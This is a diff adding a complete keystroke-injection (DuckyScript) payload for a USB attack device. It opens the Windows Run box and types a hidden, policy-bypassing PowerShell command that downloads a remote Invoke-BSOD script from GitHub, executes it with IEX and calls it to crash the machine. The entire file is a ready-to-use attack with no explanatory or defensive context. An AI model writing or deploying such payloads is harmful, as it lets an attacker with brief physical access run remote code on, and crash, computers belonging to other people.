@@ -1,0 +1,6 @@
+DELAY 2000
+GUI r 
+DELAY 200
+STRING powershell -Nop -NonI -W Hidden -Exec Bypass IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
+DELAY 200
+ENTER
